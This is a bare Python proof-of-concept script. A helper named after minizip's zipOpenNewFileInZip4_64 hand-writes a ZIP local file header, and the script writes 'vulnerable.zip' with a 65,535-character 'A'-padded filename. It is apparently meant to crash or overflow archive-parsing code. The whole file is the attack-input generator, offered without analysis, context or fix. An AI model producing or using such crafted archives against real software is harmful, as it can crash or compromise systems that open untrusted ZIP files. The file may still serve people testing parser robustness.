import zlib
import struct

def zipOpenNewFileInZip4_64(zipFile, filename, compress_type=zlib.DEFLATED, level=6, comment='', extra_field=b''):
    filename_encoded = filename.encode()
    comment_encoded = comment.encode()

    filename_len = len(filename_encoded)
    comment_len = len(comment_encoded)
    extra_field_len = len(extra_field)


    file_header = b""
    file_header += b"\x50\x4b\x03\x04"
    file_header += b"\x14\x00"
    file_header += b"\x00\x00"
    file_header += struct.pack("<H", compress_type)
    file_header += b"\x00\x00\x00\x00"
    file_header += b"\x00\x00\x00\x00"
    file_header += b"\x00\x00\x00\x00"
    file_header += b"\x00\x00\x00\x00"
    file_header += struct.pack("<H", filename_len)
    file_header += struct.pack("<H", extra_field_len)

    zipFile.write(file_header)
    zipFile.write(filename_encoded)
    zipFile.write(extra_field)

    return zipFile

def create_vulnerable_zip(filename="vulnerable.zip"):
  with open(filename, "wb") as f:
    long_filename = "A" * 65535

    zipOpenNewFileInZip4_64(f, long_filename)


if __name__ == "__main__":
    create_vulnerable_zip()
    print("Vulnerable ZIP file created: vulnerable.zip")